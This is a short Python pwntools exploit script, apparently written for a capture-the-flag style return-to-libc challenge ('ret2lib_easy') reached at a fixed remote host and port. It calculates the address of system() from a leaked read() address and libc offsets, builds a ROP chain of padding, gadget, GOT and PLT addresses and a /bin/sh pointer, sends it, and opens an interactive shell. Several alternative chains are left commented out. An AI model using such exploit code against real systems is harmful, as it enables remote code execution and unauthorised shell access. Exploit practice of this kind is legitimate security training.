#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11004

yuan = remote(host , port)
#yuan = process('./ret2lib_easy')


#cmd = sys.argv[1] + '\0'

yuan.sendline("6295584")

readaddr = 0x7fb6d14ee7b0
libc_read_offset = 0x00000000000f69a0
libc_system_offset = 0x0000000000045380
systemaddr = readaddr - libc_read_offset + libc_system_offset

read_plt = 0x4005b0
read_got = 0x601028
printf_plt = 0x4005a0
printf_got = 0x601020
memcpy_plt = 0x4005f0
pppr = 0x4008be #pop r13 ; pop r14 ; pop r15 ; ret

p = "a" * 48

#p += p64(0x40079b)
#p += p64(0x400773)
#p += p64(0x400791)
#p += p64(0x7ffff7a53380)
#p += p64(0x400773)
#p += p64(0x7ffff7b049a0)
p += p64(0x7ffff7a53380) # read
p += p64(0x400773)
#p += p64(0x4008c1) # pop rsi; pop r15
p += struct.pack("<Q", 0 )
#p += struct.pack("<Q", 123 )
#p += p64(0x4008c3) # pop rdi
p += struct.pack("<Q" , 0x600e28) #/bin/sh addr
#p += p64(0x400655) # pop rbp
p += struct.pack("<Q", 7)
#p += struct.pack("<Q", len(cmd))
"""
p += p64(0x4005b0) # read
p += p64(0x4008c1) # pop rsi; pop r15
p += struct.pack("<Q", 0 )
p += struct.pack("<Q", 123 )
p += p64(0x4008c3) # pop rdi
p += struct.pack("<Q" , 0x600e48) #stdin (system) addr addr
p += p64(0x400655) # pop rbp
p += struct.pack("<Q", 8)

p += p64(0x4005f0) # memcpy
p += p64(0x4008c1) # pop rsi; pop r15
p += struct.pack("<Q", 0x601020) # printf GOT offset
p += struct.pack("<Q", 123 )
p += p64(0x4008c3) # pop rdi
p += struct.pack("<Q" , 0x600e48)
p += p64(0x400655) # pop rbp
p += struct.pack("<Q", 8)

p += p64(0x4005a0) # printf
p += "AAAAAAAA"
p += struct.pack("<Q" , 0x600e28)

"""

print "SYS 0x%.8x" % systemaddr
#yuan.recvuntil('\n')
yuan.sendline(p)
#yuan.sendline("6295584")
#yuan.send(struct.pack("<Q",0x7fb6d143d190))
#print yuan.recvall()
#yuan.sendline(systemaddr)

yuan.interactive()
